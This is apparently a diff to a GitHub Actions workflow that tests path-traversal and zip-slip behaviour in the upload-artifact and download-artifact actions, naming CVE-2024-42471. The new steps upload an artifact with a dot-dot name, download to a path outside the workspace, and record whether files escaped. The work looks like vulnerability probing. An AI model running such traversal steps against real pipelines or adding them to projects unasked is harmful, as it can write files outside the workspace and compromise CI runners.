@@ -62,8 +62,39 @@ jobs:
         run: |
           echo "upload-artifact name 'g4../name-traversal-probe' exit-code/outcome: ${{ steps.upname.outcome }}"
           echo "steps.upname.conclusion: ${{ steps.upname.conclusion }}"
-      - name: upload evidence
+      - name: upload artifact with dot-dot name (allowed charset)
+        uses: actions/upload-artifact@v4
+        continue-on-error: true
+        id: updots
+        with:
+          name: g4..dots-probe
+          path: /tmp/evil.zip
+      - name: download dot-dot-named artifact
+        uses: actions/download-artifact@v4
+        continue-on-error: true
+        with:
+          name: g4..dots-probe
+          path: /tmp/dl-dots
+      - name: download with traversal path (CVE-2024-42471 mechanism)
+        uses: actions/download-artifact@v4
+        continue-on-error: true
+        with:
+          name: g4-zipslip-artifact
+          path: ../../g4-escape-outside-workspace
+      - name: check traversal-path download + dots
+        run: |
+          E=/tmp/zipslip2.txt
+          : > "$E"
+          echo "dot-dot name upload outcome: ${{ steps.updots.outcome }}" | tee -a "$E"
+          P="$(dirname "$GITHUB_WORKSPACE")/g4-escape-outside-workspace"
+          if [ -e "$P" ]; then echo "DOWNLOAD_PATH_ESCAPED: $P" | tee -a "$E"; else echo "no download escape at $P" | tee -a "$E"; fi
+          echo "--- files created by download-artifact near workspace root ---"
+          find "$(dirname "$GITHUB_WORKSPACE")" -maxdepth 2 \( -name 'g4-escape-outside-workspace*' -o -name 'evil.zip' \) 2>/dev/null | tee -a "$E"
+          echo "--- extracted dot-dot artifact under /tmp/dl-dots ---"
+          find /tmp/dl-dots -type f 2>/dev/null | tee -a "$E"
+          cp "$E" /tmp/zipslip2-final.txt
+      - name: upload evidence2
         uses: actions/upload-artifact@v4
         with:
-          name: g4-zipslip-evidence
-          path: /tmp/zipslip-final.txt
+          name: g4-zipslip-evidence2
+          path: /tmp/zipslip2-final.txt
